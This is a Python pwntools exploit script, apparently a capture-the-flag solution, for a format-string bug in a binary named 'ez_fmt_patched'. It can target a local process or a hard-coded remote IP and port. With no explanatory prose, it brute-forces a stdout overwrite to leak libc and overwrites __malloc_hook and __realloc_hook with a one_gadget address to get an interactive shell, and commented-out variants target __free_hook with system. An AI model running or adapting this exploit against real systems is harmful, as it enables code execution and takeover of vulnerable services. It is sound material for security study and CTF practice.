from pwn import *
from time import sleep

BEDUG = True

context.clear(arch = 'amd64')
libc = ELF('./libc.so.6')

if BEDUG == True:
    io = process('./ez_fmt_patched')
    #gdb.attach(io, '''
    #b * main+112
    #continue
    #''')
else:
    io = remote('192.81.209.60', 2022)

io.recvuntil(b'ice :##\n')

def brutewrite_stdout():
    #pause()
    one = b'c'*23
    io.sendline(one)
    for i in range(4, 11):
        pone = b'\xa0'+p8(i * 0x10 + 6)
        nice = b'%'+str(u16(pone)).encode('utf-8')+b'c%9$hn'
        #sleep(1)
        io.sendline(nice)
        log.info('sending payload: '+nice.decode('utf-8'))
        ptwo = b'%'+str(0x3887).encode('utf-8')+b'c%12$hn'
        #sleep(1)
        io.sendline(ptwo)
        log.info('trying overwrite stdout: '+ptwo.decode('utf-8'))

    for i in range(4, 11):
        pone = b'\xc0'+p8(i * 0x10 + 6)
        nice = b'%'+str(u16(pone)).encode('utf-8')+b'c%9$hn'
        #sleep(1)
        io.sendline(nice)
        log.info('sending payload: '+nice.decode('utf-8'))
        ptwo = b'%12$hhn'
        #sleep(1)
        io.sendline(ptwo)
        log.info('trying overwrite stdout: '+ptwo.decode('utf-8'))


def brutetodead():
    global io
    tmp = b'concac'
    while (b'\x7f' not in tmp):
        try:
            tmp = io.recv(timeout = 0.3)
            #print(tmp.split())
            if (tmp == b''):
                print('DEADGE')
                if BEDUG == True:
                    io.kill()
                    io = process('./ez_fmt_patched')
                else:
                    io.close()
                    io = remote('192.81.209.60', 2022)
                brutewrite_stdout()
                io.recv(timeout = 0.3)
        except:
            if BEDUG == True:
                io.kill()
                io = process('./ez_fmt_patched')
            else:
                io.close()
                io = remote('192.81.209.60', 2022)
    leak = u64(tmp.split()[1][8:14]+b'\0\0')-0x1ec980
    return leak


def getbyte(nth, num):
    return (num >> (8*nth)) & 0xff

'''
brutewrite_stdout()
io.recv()
tmp = io.recv()
while (b'\x7f' not in tmp):
    tmp = io.recv(timeout = 0.3)
    print(tmp.split())
    if (tmp == b''):
        print('DEADGE')
        exit(1)

print('Leaked: ')
leak = u64(tmp.split()[1][9:14]+b'\0\0')
print(hex(leak))
'''
libc.address = brutetodead()
log.info('Libc: '+hex(libc.address))
log.info('__malloc_hook: '+hex(libc.sym['__malloc_hook']))
log.info('system: '+hex(libc.sym['system']))
log.info(''+hex(libc.address+0x222060))
numb = libc.sym['__malloc_hook'] & 0xffff

#nice = b'%'+str(numb).encode('utf-8')+b'c%9$n'
#io.sendline(nice)

for i in range(6):
    nice = b'%'+str(numb+i).encode('utf-8')+b'c%9$hn'
    io.sendline(nice)
    bruh = b'%'+str(getbyte(i, libc.sym['realloc']+24)).encode('utf-8')+b'c%12$hhn'
    io.sendline(bruh)

#p3 = fmtstr_payload(6, {libc.address+0x222060:libc.address+0xe3b04}, 0, write_size='short')
p2 = fmtstr_payload(6, {libc.sym['__realloc_hook']:libc.address+0xe3afe}, 0, write_size='short').replace(b'a', b'!')
print(p2)
io.sendline(p2)
#io.sendline(b'%70000c')


#p1 = b'%26739c%8$lln!!!'+p64(libc.sym['__free_hook']-8) #b'@nQF\xe2\x7f\x00\x00'
#p2 = b'%41616c%11$lln%41895c%12$hn%14763c%13$hn'+p64(libc.sym['__free_hook'])+p64(libc.sym['__free_hook']+2)+p64(libc.sym['__free_hook']+4)#b'HnQF\xe2\x7f\x00\x00JnQF\xe2\x7f\x00\x00LnQF\xe2\x7f\x00\x00'

'''
writes = {libc.sym['__free_hook']-8:u64(b'sh\0\0\0\0\0\0')}
pl = fmtstr_payload(6, writes, 0, write_size='short')
print(pl)
pause()
io.sendline(pl)
'''
#writes = {libc.sym['__free_hook']:libc.sym['system']}
#p2 = fmtstr_payload(6, writes, 0, write_size='short')
#io.sendline(p1)
#io.sendline(p2)
#print(p1)
#print(p2)
#gdb.attach(io)
io.interactive()
